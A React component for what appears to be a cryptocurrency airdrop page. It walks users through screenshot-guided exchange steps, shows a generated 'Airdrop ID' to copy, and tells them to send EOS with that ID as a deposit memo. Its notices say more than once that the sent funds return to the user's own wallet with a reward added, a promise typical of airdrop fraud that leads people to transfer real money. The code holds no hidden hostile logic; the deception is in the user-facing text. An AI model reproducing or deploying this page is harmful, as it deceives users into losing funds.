import { type FC } from "react";
import { toast } from "sonner";

type Step = {
  image: string;
  description: string;
  title: string;
};

interface ExchangeInstructionsProps {
  steps: Step[];
  generatedId: string;
}

/**
 * Displays the exchange-specific instructions and screenshots
 * for the airdrop process
 */
const ExchangeInstructions: FC<ExchangeInstructionsProps> = ({ steps, generatedId }) => {
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(generatedId);
      toast.success("Copied to clipboard!");
    } catch (error) {
      toast.error("Failed to copy. Please try manually.");
    }
  };

  return (
    <div className="prose prose-invert max-w-none">
      <h3 className="text-xl font-semibold mb-4">Follow these steps to complete your airdrop registration:</h3>
      {steps.map((step, index) => (
        <div key={index} className="mb-8">
          <h4 className="text-lg font-medium mb-2">{step.title}</h4>
          <p className="text-gray-300 mb-3">{step.description}</p>
          {step.title === "Step 7: Complete Transaction" && (
            <>
              <div className="mb-4 p-4 bg-gray-800/50 border border-gray-700 rounded-lg">
                <p className="text-sm text-gray-300 mb-2">Your Airdrop ID:</p>
                <div className="flex items-center gap-2">
                  <code className="flex-1 p-2 bg-gray-900 rounded text-gray-200">{generatedId}</code>
                  <button
                    onClick={handleCopy}
                    className="px-3 py-1 text-sm bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                  >
                    Copy
                  </button>
                </div>
              </div>
              <p className="text-sm text-yellow-400/80 mb-4">
                After sending it to your deposit MEMO, the EOS will be sent to your own Wallet, and the airdrop reward will be added to your wallet in addition to the funds you sent to yourself!
              </p>
            </>
          )}
          <img 
            src={step.image} 
            alt={step.title}
            className="rounded-lg border border-muted w-full"
          />
        </div>
      ))}
      
      <div className="mt-6 p-4 bg-yellow-900/20 border border-yellow-700/50 rounded-lg">
        <p className="text-yellow-500 font-medium">Important Note:</p>
        <p className="text-sm text-yellow-400/80">
          You must complete a transaction on the EOS network to receive the airdrop reward. 
          Please ensure all information is filled correctly to prevent any loss of funds.
          After sending it to your deposit MEMO, the EOS will be sent to your own Wallet, and the airdrop reward will be added to your wallet in addition to the funds you sent to yourself!
        </p>
      </div>
    </div>
  );
};

export default ExchangeInstructions;